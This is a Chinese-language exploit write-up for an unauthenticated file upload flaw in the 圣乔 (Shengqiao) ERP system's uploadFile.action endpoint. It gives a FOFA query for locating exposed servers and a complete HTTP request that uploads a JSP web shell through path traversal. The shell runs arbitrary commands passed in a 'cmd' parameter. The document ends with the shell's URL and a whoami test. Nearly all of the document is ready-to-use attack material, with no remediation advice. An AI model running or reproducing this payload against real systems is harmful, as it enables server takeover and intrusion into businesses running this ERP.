# 圣乔ERP系统uploadFile文件上传漏洞

圣乔ERP系统 uploadFile.action 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```javascript
title="圣乔ERP系统"
```

## poc

```javascript
POST /erp/wap/../uploadFile.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip
Connection: close

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Filedata"; filename="rce.jsp"
Content-Type: image/png

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```

![image-20241211210137494](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112101562.png)

文件路径:`/erp/wap/../FileStorageDirectorynull/rce.jsp?cmd=whoami`